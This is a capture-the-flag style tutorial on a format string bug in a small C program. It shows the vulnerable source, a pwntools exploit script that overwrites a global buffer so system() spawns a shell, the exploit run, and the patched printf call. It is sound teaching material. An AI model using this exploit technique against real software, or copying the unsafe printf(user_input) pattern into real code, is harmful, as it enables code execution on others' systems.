Let's take a look at the source code...

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char buf0[100];

int main()
{
  char buf1[200];

  printf("Do you really want to escape, the celebration is nearing.\n");
  fgets(buf1, sizeof(buf1), stdin);

  strcpy(buf0, "ls -asl");
  printf(buf1);

  printf("Here look at all of the wonderful things you have to research.\n");
  system(buf0);
}
```

So we see here, that the exploit to this seems fairly sstraight forward. Just use the printf vulnearbillity to overwrite the value of buf0 with "sh" and we have a shell. However this time, we will be going about doing it using pwntools. Pwntools is a python library designed exclusively for solving ctf challenges, and it does make your life a whole lot easier.  For instance...

For packing hex strings in little endian for 32 bit and 64 bit, pwntools can handle that

```
>>> p32(0xdeadbeef)
'\xef\xbe\xad\xde'
```

It can also pack strings, and other things as integers

```
>>> u32("escp")
1885565797
```

It can pull addresses for symbols from programs just like object dump

```
>>> from pwn import *
>>> elf = ELF("f5")
[*] '/Hackery/escape/fmt_str/f5/f5'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
>>> context(binary=elf)
>>> print hex(elf.symbols["main"])
0x80484ab
```

These are only a couple of the conviniet things pwn tools can do.


The first thing we will need to do is find where our input is on the stack.

```
guyinatuxedo@tux:/Hackery/escape/fmt_str/f5$ python -c 'print "0000" + "%x."*20' | ./f5
Do you really want to escape, the celebration is nearing.
0000c8.f7fb45a0.f7ffdc08.0.0.30303030.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.
Here look at all of the wonderful things you have to research.
total 32
4 drwxr-xr-x  2 root root 4096 Feb 26 19:09 .
4 drwxr-xr-x 10 root root 4096 Feb 26 13:46 ..
4 -rw-r--r--  1 root root  517 Feb 26 19:06 exploit.py
8 -rwxr-xr-x  1 root root 5504 Feb 26 18:40 f5
4 -rw-r--r--  1 root root  352 Feb 26 18:45 f5.c
4 -rw-------  1 root root    6 Feb 26 18:00 .gdb_history
4 -rw-r--r--  1 root root  109 Feb 26 19:09 out
```

So we can see that our input is stored 6 stack values away. So that is pretty much all we need, other than the name of the buffer we are going to overwrite. pwntools will handle the rest for us. One thing I would like to point out, the reason why the string in the u32 has "\0\0" in it is because u32 needs a 4 byte string to work with, and since sh is only two we can fill it with two null bytes.

```
guyinatuxedo@tux:/Hackery/escape/fmt_str/f5$ cat exploit.py 
#Import pwntools
from pwn import *

#Specify what elf they should pull symbols for
elf = ELF("f5")
context(binary=elf)

#Start the challenge as a process pwntools can interface with
target = process("./f5")


#Create the payload using the location of the input, address of buf0, and sh packed in hex form.
payload = fmtstr_payload(6, {elf.symbols["buf0"]: u32("sh\0\0")})
print payload

#Send the payload
target.sendline(payload)

#Drop to an interactive shell so we can use the shell we created
target.interactive()
```

Now let's try it

```
guyinatuxedo@tux:/Hackery/escape/fmt_str/f5$ python exploit.py 
[*] '/Hackery/escape/fmt_str/f5/f5'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
[+] Starting local process './f5': Done
\x80\x98\x0\x81\x98\x0\x82\x98\x0\x83\x98\x0%99c%6$hhn%245c%7$hhn%152c%8$hhn%9$hhn
[*] Switching to interactive mode
Do you really want to escape, the celebration is nearing.
\x80\x98\x0\x81\x98\x0\x82\x98\x0\x83\x98\x0                                                                                                  �                                                                                                                                                                                                                                                    \xa0                                                                                                                                                      
Here look at all of the wonderful things you have to research.
$ cat out
Fine, while your busy running away I will start welcoming people. To the celebration. For you. Level Cleared
$ ls
exploit.py  f5    f5.c  out
$ echo It works!
It works!
$ exit
[*] Got EOF while reading in interactive
$ exit
[*] Process './f5' stopped with exit code 0
[*] Got EOF while sending in interactive
```

Just like that, we pwned the binary. Now let's patch it.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char buf0[100];

int main()
{
  char buf1[200];

  printf("Do you really want to escape, the celebration is nearing.\n");
  fgets(buf1, sizeof(buf1), stdin);

  strcpy(buf0, "ls -asl");
  printf("%s\n", buf1);

  printf("Here look at all of the wonderful things you have to research.\n");
  system(buf0);
}
```

So the exploit should no longer work, since we are now printing out user defined data fomratted as a string, so an attacker shouldn't be able to use special flags. Let's test it.

```
guyinatuxedo@tux:/Hackery/escape/fmt_str/f5$ ./f5_secure 
Do you really want to escape, the celebration is nearing.
%x
%x

Here look at all of the wonderful things you have to research.
total 44
4 drwxr-xr-x  2 root root 4096 Feb 26 19:13 .
4 drwxr-xr-x 10 root root 4096 Feb 26 13:46 ..
4 -rw-r--r--  1 root root  517 Feb 26 19:06 exploit.py
8 -rwxr-xr-x  1 root root 5504 Feb 26 18:40 f5
4 -rw-r--r--  1 root root  352 Feb 26 18:45 f5.c
8 -rwxr-xr-x  1 root root 7476 Feb 26 19:13 f5_secure
4 -rw-r--r--  1 root root  360 Feb 26 19:12 f5_secure.c
4 -rw-------  1 root root    6 Feb 26 18:00 .gdb_history
4 -rw-r--r--  1 root root  109 Feb 26 19:09 out
```

Just like that, we patched the binary.
